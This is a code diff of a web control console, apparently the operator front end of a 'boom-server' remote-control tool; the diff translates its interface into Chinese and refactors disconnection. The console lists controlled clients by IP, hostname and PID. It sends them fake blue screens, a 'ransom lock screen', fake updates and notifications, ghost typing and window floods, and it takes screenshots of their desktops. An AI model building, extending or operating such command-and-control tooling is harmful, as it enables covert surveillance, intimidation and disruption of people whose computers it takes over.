-                    $("loginBtn").innerHTML = "Enter console";
-                    if ($("loginScreen").style.display === "none") showMsg("Disconnected", true);
+                    $("loginBtn").innerHTML = "进入控制台";
+                    if ($("loginScreen").style.display === "none") showMsg("已断开连接", true);
                 };
                 ws.onerror = function() {
-                    showTokenError("Failed to connect to server");
+                    showTokenError("连接服务器失败");
                     $("loginBtn").disabled = false;
-                    $("loginBtn").innerHTML = "Enter console";
+                    $("loginBtn").innerHTML = "进入控制台";
                 };
             } catch(e) {
-                showTokenError("Connection failed: " + e.message);
+                showTokenError("连接失败: " + e.message);
                 $("loginBtn").disabled = false;
-                $("loginBtn").innerHTML = "Enter console";
+                $("loginBtn").innerHTML = "进入控制台";
             }
+        }
+
+        function disconnect() {
+            if (ws) {
+                ws.close();
+                ws = null;
+            }
+            updateStatus(false);
+            stopPoll();
+            $("loginScreen").style.display = "block";
+            $("mainScreen").style.display = "none";
+            $("loginBtn").disabled = false;
+            $("loginBtn").innerHTML = "进入控制台";
+            hideTokenError();
         }
 
         function toggleConnection() {
             if (ws) {
-                ws.close();
-                ws = null;
-                updateStatus(false);
-                stopPoll();
-                $("loginScreen").style.display = "block";
-                $("mainScreen").style.display = "none";
-                $("loginBtn").disabled = false;
-                $("loginBtn").innerHTML = "Enter console";
-                hideTokenError();
+                disconnect();
             } else {
                 connect();
             }
@@ -710,45 +1355,57 @@
             var s = $("wsStatus");
             var b = $("connectBtn");
             var versionBtn = $("versionBtn");
+            var appBarDot = $("appBarDot");
+            var appBarStatusText = $("appBarStatusText");
             var secs = getSectionNodes();
             var i;
             if (online) {
-                s.innerHTML = '<span class="status-dot dot-online"></span>Connected';
+                s.innerHTML = '<span class="status-dot dot-online" style="vertical-align:middle;margin-right:4px;"></span>已连接';
                 s.className = "metric-value connected";
-                b.innerHTML = "Disconnect";
+                b.innerHTML = "断开连接";
+                b.className = "btn btn-outlined";
                 versionBtn.disabled = false;
+                if (appBarDot) { appBarDot.className = "status-dot dot-online"; }
+                if (appBarStatusText) { appBarStatusText.textContent = "已连接"; }
                 for (i = 0; i < secs.length; i++) secs[i].style.display = "block";
             } else {
-                s.innerHTML = '<span class="status-dot dot-offline"></span>Disconnected';
+                s.innerHTML = '<span class="status-dot dot-offline" style="vertical-align:middle;margin-right:4px;"></span>已断开';
                 s.className = "metric-value disconnected";
-                b.innerHTML = "Connect server";
+                b.innerHTML = "连接服务器";
+                b.className = "btn btn-filled";
                 versionBtn.disabled = true;
-                $("serverVersion").innerHTML = "Unknown";
-                $("versionCheckedAt").innerHTML = "Never";
+                if (appBarDot) { appBarDot.className = "status-dot dot-offline"; }
+                if (appBarStatusText) { appBarStatusText.textContent = "未连接"; }
+                $("serverVersion").innerHTML = "未知";
+                $("versionCheckedAt").innerHTML = "从未";
                 for (i = 0; i < secs.length; i++) secs[i].style.display = "none";
-                $("clientList").innerHTML = '<span class="empty-note">Waiting for clients...</span>';
-                $("targetSelect").innerHTML = '<option value="">All clients</option>';
+                $("clientList").innerHTML = '<div class="empty-note">等待客户端接入...</div>';
+                $("targetSelect").innerHTML = '<option value="">全部受控端</option>';
                 $("clientCount").innerHTML = "0";
             }
         }
 
+        function checkVersion() {
+            requestServerStatus();
+        }
+
         function requestServerStatus() {
             if (!ws || ws.readyState !== 1) {
-                showMsg("Not connected", true);
+                showMsg("未连接", true);
                 return;
             }
             $("versionBtn").disabled = true;
-            $("versionBtn").innerHTML = "Checking...";
+            $("versionBtn").innerHTML = "检查中...";
             ws.send(JSON.stringify({type: "server_status"}));
         }
 
         function updateServerStatus(status) {
             var systemd = status.systemd || {};
-            $("serverVersion").innerHTML = escapeHtml(status.server_version || "Unknown");
+            $("serverVersion").innerHTML = escapeHtml(status.server_version || "未知");
             $("serverService").innerHTML = escapeHtml(status.service_name || "boom-server");
             $("versionCheckedAt").innerHTML = formatTime(status.server_time);
             $("versionBtn").disabled = false;
-            $("versionBtn").innerHTML = "Check version";
+            $("versionBtn").innerHTML = "检查版本";
             if (systemd.ActiveState) {
                 $("serverService").innerHTML = escapeHtml((status.service_name || "boom-server") + " / " + systemd.ActiveState);
             }
@@ -763,30 +1420,30 @@
             var i;
             var c;
             if (clients.length === 0) {
-                el.innerHTML = '<span class="empty-note">No online clients</span>';
-                sel.innerHTML = '<option value="">All clients</option>';
+                el.innerHTML = '<div class="empty-note">暂无在线客户端</div>';
+                sel.innerHTML = '<option value="">全部受控端</option>';
                 return;
             }
-            sel.innerHTML = '<option value="">All clients</option>';
+            sel.innerHTML = '<option value="">全部受控端</option>';
             for (i = 0; i < clients.length; i++) {
                 c = clients[i];
-                html += '<div class="client-item">';
+                html += '<div class="client-card">';
                 html += '<div class="client-header"><span class="client-id"><span class="status-dot dot-online"></span>' + escapeHtml(c.id) + "</span></div>";
                 html += '<div class="client-grid">';
-                html += fieldHtml("Local IP", c.local_ip || c.ip);
-                html += fieldHtml("Remote IP", c.remote_ip);
-                html += fieldHtml("Hostname", c.hostname);
-                html += fieldHtml("System", c.system);
-                html += fieldHtml("Platform", c.platform);
-                html += fieldHtml("Timezone", c.timezone);
-                html += fieldHtml("Screen", c.screen);
+                html += fieldHtml("本地 IP", c.local_ip || c.ip);
+                html += fieldHtml("远程 IP", c.remote_ip);
+                html += fieldHtml("主机名", c.hostname);
+                html += fieldHtml("系统", c.system);
+                html += fieldHtml("平台", c.platform);
+                html += fieldHtml("时区", c.timezone);
+                html += fieldHtml("屏幕", c.screen);
                 html += fieldHtml("PID", c.pid);
-                html += fieldHtml("Python", c.python);
+                html += fieldHtml("Python 版本", c.python);
                 html += fieldHtml("Stage", c.stage);
-                html += fieldHtml("Mode", c.background ? "Background" : "Window");
-                html += fieldHtml("Version", c.client_version);
-                html += '<div class="clear"></div></div>';
-                html += '<div class="client-meta">Connected: ' + formatTime(c.connected_at) + " &nbsp; Last seen: " + formatTime(c.last_seen) + "</div>";
+                html += fieldHtml("模式", c.background ? "后台" : "窗口");
+                html += fieldHtml("客户端版本", c.client_version);
+                html += '</div>';
+                html += '<div class="client-meta">接入时间：' + formatTime(c.connected_at) + " &nbsp; 最后活跃：" + formatTime(c.last_seen) + "</div>";
                 html += "</div>";
                 sel.innerHTML += '<option value="' + escapeHtml(c.id) + '">' + escapeHtml(c.id) + " (" + escapeHtml(c.local_ip || c.ip) + ")</option>";
             }
@@ -808,37 +1465,38 @@
         }
 
         function sendCommand(cmd) {
-            if (!ws || ws.readyState !== 1) { showMsg("Not connected", true); return; }
+            if (!ws || ws.readyState !== 1) { showMsg("未连接服务器", true); return; }
             var target = $("targetSelect").value;
             var names = {
-                stage_1: "Stage 1",
-                stage_2: "Stage 2",
-                stage_3: "Blue screen",
-                stage_4: "Ransom screen",
-                stage_force: "Force notice",
-                prank_desktop: "Move windows",
-                prank_flip_screen: "Flip screen",
-                prank_fake_update: "Fake update",
-                prank_glitch: "Glitch screen",
-                prank_infinite_window: "Infinite windows",
-                prank_ghost_typing: "Ghost typing",
-                prank_rickroll: "Rickroll",
-                prank_fake_notify: "Fake notification",
-                exit: "Close windows"
+                stage_1: "单窗警告",
+                stage_2: "连击弹窗",
+                stage_3: "蓝屏死机",
+                stage_4: "勒索锁屏",
+                stage_force: "强制封锁通告",
+                prank_desktop: "桌面窗口打乱",
+                prank_flip_screen: "翻转屏幕",
+                prank_fake_update: "假系统更新",
+                prank_glitch: "屏幕故障艺术",
+                prank_infinite_window: "窗口无限繁殖",
+                prank_ghost_typing: "幽灵打字机",
+                prank_rickroll: "瑞克摇",
+                prank_fake_notify: "假系统通知",
+                prank_negative: "负片世界",
+                exit: "一键清除恢复"
             };
-            ws.send(JSON.stringify({type: "control", command: cmd, target_client: target || null, config: null}));
-            showMsg("Sent: " + (names[cmd] || cmd));
+            ws.send(JSON.stringify({type: "control", command: cmd, target: target || null}));
+            showMsg("已发送：" + (names[cmd] || cmd));
         }
 
         function sendScreenshot() {
             var target = $("targetSelect").value;
-            if (!target) { alert('请先选择一个客户端'); return; }
+            if (!target) { showMsg('请先选择一个客户端', true); return; }
             ws.send(JSON.stringify({type: "control", command: "screenshot", target: target}));
-            showMsg('📸 等待截图...');
+            showMsg('正在等待截图...');
         }
 
         function sendConfig() {
-            if (!ws || ws.readyState !== 1) { showMsg("Not connected", true); return; }
+            if (!ws || ws.readyState !== 1) { showMsg("未连接服务器", true); return; }
             var config = {
                 stage1_title: $("cfgTitle").value,
                 stage1_text1: $("cfgText1").value,
@@ -847,8 +1505,8 @@
                 target_name: $("cfgName").value
             };
             var target = $("targetSelect").value;
-            ws.send(JSON.stringify({type: "control", command: null, target_client: target || null, config: config}));
-            showMsg("Config sent");
+            ws.send(JSON.stringify({type: "control", command: null, target: target || null, config: config}));
+            showMsg("配置已下发");
         }
 
         $("tokenInput").onkeyup = function(e) {
